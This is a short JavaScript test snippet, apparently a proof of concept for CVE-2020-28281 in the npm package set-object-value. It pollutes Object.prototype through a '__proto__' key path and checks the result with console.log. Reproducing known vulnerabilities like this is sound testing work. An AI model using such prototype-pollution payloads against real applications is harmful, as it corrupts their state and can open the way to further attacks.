// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28281
// test("prototype pollution in setObjectValue", () => {
  var setObjectValue = require("set-object-value");
  obj = {};

console.log({}.polluted);
//setObjectValue(obj, ["constructor","prototype", "polluted"], "yes");
setObjectValue(obj, ["__proto__", "polluted"], "yes");
console.log({}.polluted);
// });
